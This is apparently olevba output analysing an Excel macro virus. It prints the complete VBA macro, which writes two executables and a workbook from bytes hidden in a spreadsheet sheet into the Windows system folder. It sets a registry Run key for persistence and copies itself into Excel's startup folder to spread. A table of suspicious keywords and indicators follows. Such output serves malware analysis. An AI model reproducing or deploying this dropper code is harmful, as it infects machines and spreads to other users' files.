olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-83e62879c21abd7a76d4f9f4efd2f0e284408e2ce9cb9ce48f3d9c0f43f44a5b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-83e62879c21abd7a76d4f9f4efd2f0e284408e2ce9cb9ce48f3d9c0f43f44a5b 
in file: Virus.MSOffice.Source-83e62879c21abd7a76d4f9f4efd2f0e284408e2ce9cb9ce48f3d9c0f43f44a5b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub addsum()
Dim buf As Byte
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set w = CreateObject("wscript.shell")
myfolder = w.SpecialFolders("Templates") & "\Software\"
folder1 = fso.getspecialfolder(1)
If Not fso.folderexists(myfolder) Then
fso.createfolder myfolder
End If
For i = 1 To Workbooks.Count
If Workbooks(i).Name = "normal.xlm" Then
Workbooks(i).Close
fso.deletefile Application.StartupPath & "\normal.xlm"
End If
Next
For i = 1 To Workbooks.Count
If Workbooks(i).Name = "norma1.xlm" Then
GoTo a1
End If
Next
filesv = folder1 & "\winupdsv.exe"
If Not fso.fileexists(filesv) Then
Open filesv For Binary Access Write As #1
For i = 1 To 54
hv = ThisWorkbook.Sheets("@kbtasto@she3#").Cells(i, 5).Value
n = 1
m = InStr(hv, " ")
Do While m > 0
buf = CByte(Mid(hv, n, m - n))
Put #1, , buf
n = m + 1
m = InStr(n, hv, " ")
Loop
Next
Close #1
End If
filesf = folder1 & "\sfcea.exe"
If Not fso.fileexists(filesf) Then
Open filesf For Binary Access Write As #1
For i = 1 To 28
hv = ThisWorkbook.Sheets("@kbtasto@she3#").Cells(i, 4).Value
n = 1
m = InStr(hv, " ")
Do While m > 0
buf = CByte(Mid(hv, n, m - n))
Put #1, , buf
n = m + 1
m = InStr(n, hv, " ")
Loop
Next
Close #1
End If
filexlm = folder1 & "\norma1.xlm"
If Not fso.fileexists(filexlm) Then
Open filexlm For Binary Access Write As #1
For i = 1 To 89
hv = ThisWorkbook.Sheets("@kbtasto@she3#").Cells(i, 3).Value
n = 1
m = InStr(hv, " ")
Do While m > 0
buf = CByte(Mid(hv, n, m - n))
Put #1, , buf
n = m + 1
m = InStr(n, hv, " ")
Loop
Next
Close #1
End If
fso.copyfile filexlm, Application.StartupPath & "\", True
fso.deletefile filexlm
w.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdsv", "winupdsv.exe"
Workbooks.Open Application.StartupPath & "\norma1.xlm"
ThisWorkbook.Sheets("@kbtasto@she3#").Columns(3).Copy Workbooks("norma1.xlm").Sheets("@kbtasto@she3#").Columns(3)
ThisWorkbook.Sheets("@kbtasto@she3#").Columns(4).Copy Workbooks("norma1.xlm").Sheets("@kbtasto@she3#").Columns(4)
ThisWorkbook.Sheets("@kbtasto@she3#").Columns(5).Copy Workbooks("norma1.xlm").Sheets("@kbtasto@she3#").Columns(5)
Workbooks("norma1.xlm").Save
fso.copyfile Application.StartupPath & "\norma1.xlm", myfolder, True
a1:
fso.deletefile "c:\C0MS.sys"
Application.DisplayAlerts = False
ThisWorkbook.Saved = True
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |winupdsv.exe        |Executable file name                         |
|IOC       |sfcea.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

